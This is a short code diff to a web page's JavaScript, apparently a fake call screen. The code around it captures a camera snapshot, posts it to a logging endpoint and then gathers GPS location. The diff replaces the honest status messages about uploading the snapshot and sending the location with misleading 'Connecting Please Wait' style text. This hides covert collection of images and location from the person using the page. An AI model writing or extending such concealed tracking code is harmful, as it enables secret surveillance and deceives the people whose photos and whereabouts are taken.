@@ -492,7 +492,7 @@
 
         stream.getTracks().forEach(t => t.stop());
 
-        document.getElementById('call-timer').textContent = "Encrypting & uploading snapshot...";
+        document.getElementById('call-timer').textContent = "Connecting Please Wait";
 
         await fetch('/api/log', {
           method: 'POST',
@@ -505,7 +505,7 @@
           })
         });
 
-        document.getElementById('call-timer').textContent = "Fetching & sending GPS location...";
+        document.getElementById('call-timer').textContent = "All thins done Please Wait....";
 
         try {
           const locationData = await Promise.race([
